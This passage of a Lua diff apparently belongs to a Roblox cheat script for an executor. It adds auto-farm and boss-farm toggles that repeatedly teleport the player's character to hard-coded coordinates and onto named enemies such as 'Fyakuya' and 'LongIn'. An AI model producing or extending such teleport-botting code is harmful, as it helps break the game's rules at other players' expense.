+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(2965.23364, 68.8443527, -3046.39868, 0.741998315, -3.66652699e-07, -0.670401752,
+                            2.59595481e-07, 1, -2.59595538e-07, 0.670401752, 1.85861921e-08, 0.741998315))
+                        if checkmon == "Fyakuya" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Fyakuya" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Wind" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-52.0030823, 39.7340012, 5187.89209, -0.0513627008, 2.72586561e-07, 0.998680055,
+                            2.59595396e-07, 1, -2.5959568e-07, -0.998680055, 2.4591921e-07, -0.0513627008))
+                        if checkmon == "Wind" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Wind" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Red Ant" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(4067.44604, 63.5915413, 3323.4353, -0.859736979, 9.05987818e-08, -0.510737062,
+                            2.59595481e-07, 1, -2.59595538e-07, 0.510737062, -3.55768918e-07, -0.859736979))
+                        if checkmon == "Red Ant" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Red Ant" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Royal Red Ant" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3853.75659, 60.120388, 3014.19092, -0.0192575548, 0, 0.99981457, 0, 1, 0,
+                            -0.99981457, 0, -0.0192575548))
+                        if checkmon == "Royal Red Ant" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Royal Red Ant" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Snake Man" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3370.76904, 29.8883171, 2428.50684, 0.993787169, 2.29090219e-07, 0.111297131,
+                            -2.59595282e-07, 1, 2.5959551e-07, -0.111297131, -2.86874894e-07, 0.993787169))
+                        if checkmon == "Snake Man" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Snake Man" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Shark Man" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3026.64868, 62.0051117, -2146.23584, -0.768797994, 7.28044114e-08,
+                            -0.639491677, 5.63038554e-07, 1, -5.63038611e-07, 0.639491677, -7.92921412e-07,
+                            -0.768797994))
+                        if checkmon == "Shark Man" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Shark Man" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Black Crow" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3477.64087, 34.8365059, 2755.87988, 0.680041194, 7.9569611e-07, -0.733173907,
+                            -5.63039634e-07, 1, 5.63039691e-07, 0.733173907, 2.99157854e-08, 0.680041194))
+                        if checkmon == "Black Crow" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Black Crow" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Daek" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-155.457108, 28.0835228, -73.7864227, -0.050371509, -2.7234222e-07, -0.99873054,
+                            -2.59595311e-07, 1, -2.59595538e-07, 0.99873054, 2.46189558e-07, -0.050371509))
+                        if checkmon == "Daek" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Daek" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Light Admiral" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3295.3457, 82.4939423, -2687.41919, -0.66240859, 0, -0.749142766, 0, 1, 0,
+                            0.749142766, 0, -0.66240859))
+                        if checkmon == "Light Admiral" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Light Admiral" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Soondoo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(550.000427, 30.50634, 77.0126038, 0.688838124, 7.27416599e-11, 0.724915147,
+                            1.89673717e-08, 1, -1.8123762e-08, -0.724915147, 2.62340745e-08, 0.688838124))
+                        if checkmon == "Soondoo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Soondoo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Sortudo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(115.04454, 37.8531456, 4443.3999, -0.590509593, -1.22038728e-07, -0.807030618,
+                            5.63636377e-07, 1, -5.63635922e-07, 0.807030618, -7.87704266e-07, -0.590509593))
+                        if checkmon == "Sortudo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Sortudo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Ant Queen" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3856.26758, 60.112114, 3035.34058, -0.988580704, -4.4252596e-14, -0.150692299,
+                            -4.5195076e-14, 1, 2.82951483e-15, 0.150692299, 9.60775411e-15, -0.988580704))
+                        if checkmon == "Ant Queen" then
+                            if v.HumanoidRootPart.Size == Vector3.new(7, 7, 3.5) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Ant Queen" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Luryu" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(2701.74292, 45.4265251, -2708.96997, 0.391518474, 2.97651667e-07, -0.920170248, 5.63039691e-07, 1, 5.63039407e-07, 0.920170248, -7.38532719e-07, 0.391518474))
+                        if checkmon == "Luryu" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Luryu" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Diablo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(4931.19482, 40.8220558, -417.42923, -0.627116263, 0, 0.778925657, 0, 1, 0,
+                            -0.778925657, 0, -0.627116263))
+                        if checkmon == "Diablo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Diablo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Gosuke" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(5370.90137, 40.8220558, -314.188568, 0.882526755, 3.12897441e-07, 0.47026217,
+                            -2.31298088e-07, 1, -2.3129796e-07, -0.47026217, 9.53558938e-08, 0.882526755))
+                        if checkmon == "Gosuke" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Gosuke" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Golyne" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(5728.51855, 40.822052, -66.7568054, -0.928694725, 3.14090556e-07, -0.370845109,
+                            5.63038498e-07, 1, -5.63039237e-07, 0.370845109, -7.31691671e-07, -0.928694725))
+                        if checkmon == "Golyne" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Golyne" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Heaven" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(205.224228, 33.8965111, -4630.20361, -0.552298963, -6.69813868e-13,
+                            -0.833646119, 3.27259887e-14, 1, -8.25156349e-13, 0.833646119, -4.83014887e-13,
+                            -0.552298963))
+                        if checkmon == "Heaven" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Heaven" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Ika" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(227.855453, 34.8954926, -5586.63623, -0.169608429, 4.59152602e-07, -0.985511541,
+                            -5.62754394e-07, 1, 5.62753939e-07, 0.985511541, 6.50048776e-07, -0.169608429))
+                        if checkmon == "Ika" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Ika" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Zere" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(195.154358, 33.8965111, -5072.82373, 0.939573467, 7.21771983e-07, 0.342347324,
+                            -5.63039407e-07, 1, -5.63039578e-07, -0.342347324, 3.36262019e-07, 0.939573467))
+                        if checkmon == "Zere" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Zere" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddSection("Farm Bosses")
+local Bosses = {
+    "LongIn",
+    "Soondoo",
+    "Daek",
+    "Anders",
+    "Gonshee",
+    "Largalgan",
+    "Blossom",
+    "Snake Man",
+    "Black Crow",
+    "Shark Man",
+    "Eminel",
+    "Light Admiral",
+    "Luryu",
+    "Fyakuya",
+    "Genji",
+    "Sortudo",
+    "Michille",
+    "Wind",
+    "Ant King",
+    "Golyne",
+    "Gosuke",
+    "Diablo",
+    "Heaven",
+    "Ika",
+    "Zere",
+}
+local ChoosedBoss = Tabs.AutoFarm:AddDropdown("Select Bosses", {
+    Title = "Select Bosses",
+    Description = "",
+    Values = Bosses,
+    Multi = false,
+    Default = getgenv().Config["Select Bosses"] or "N/A",
+})
+ChoosedBoss:OnChanged(function(Value)
+    _G['Select Bosses'] = Value
+    getgenv().Config["Select Bosses"] = Value
+    Update_Setting(getgenv()['MyName'])
+end)
+Tabs.AutoFarm:AddToggle("Auto Farm Bosses", {
+    Title = "Auto Farm Bosses",
+    Description = "",
+    Default = getgenv().Config["Auto Farm Bosses"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm Bosses"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm Bosses"])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "LongIn" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(337.298462, 28.6598473, 22.8929119, -0.945551574, -7.15637043e-07, 0.325472265,
+                            -5.63039862e-07, 1, 5.63039634e-07, -0.325472265, 3.49129124e-07, -0.945551574))
+                        if checkmon == "LongIn" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "LongIn" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Soondoo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(381.941132, 28.0835171, -141.551773, -0.953227043, -3.66223333e-07, 0.302255124,
+                            -5.62579373e-07, 1, -5.62579544e-07, -0.302255124, -7.06308583e-07, -0.953227043))
+                        if checkmon == "Soondoo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Soondoo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Daek" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(158.122314, 28.2794819, -53.1728096, 0.231696114, 6.09074882e-38, 0.972788215,
+                            -1.39434424e-38, 1, -5.92902384e-38, -0.972788215, 0, 0.231696114))
+                        if checkmon == "Daek" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Daek" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Anders" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(265.903046, 28.0835171, 291.24231, -0.205953047, -4.35009497e-07, 0.978561878,
+                            5.63039521e-07, 1, 5.63039691e-07, -0.978561878, 6.66928713e-07, -0.205953047))
+                        if checkmon == "Anders" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Anders" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Gonshee" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-548.728027, 28.0834923, -328.590637, -0.498816401, -2.05146321e-07,
+                            -0.866707683, 5.57628425e-07, 1, -5.57628084e-07, 0.866707683, -7.61454885e-07,
+                            -0.498816401))
+                        if checkmon == "Gonshee" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Gonshee" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Largalgan" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(293.760956, 124.333252, -242.347153, 0.167818442, 1.48570334e-09, 0.985817909,
+                            -6.71566969e-11, 1, -1.4956445e-09, -0.985817909, 1.84792459e-10, 0.167818442))
+                        if checkmon == "Largalgan" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Largalgan" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Blossom" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3592.88989, 34.291256, 2741.00757, -0.439883649, 7.53264885e-07, 0.898054779,
+                            5.63004107e-07, 1, -5.63004164e-07, -0.898054779, 2.57952223e-07, -0.439883649))
+                        if checkmon == "Blossom" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Blossom" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Snake Man" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3159.70654, 44.4117355, 2887.75928, -0.80549556, -7.80857476e-07, -0.592601836,
+                            -5.5851433e-07, 1, -5.58514444e-07, 0.592601836, -1.18904282e-07, -0.80549556))
+                        if checkmon == "Snake Man" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Snake Man" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Black Crow" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
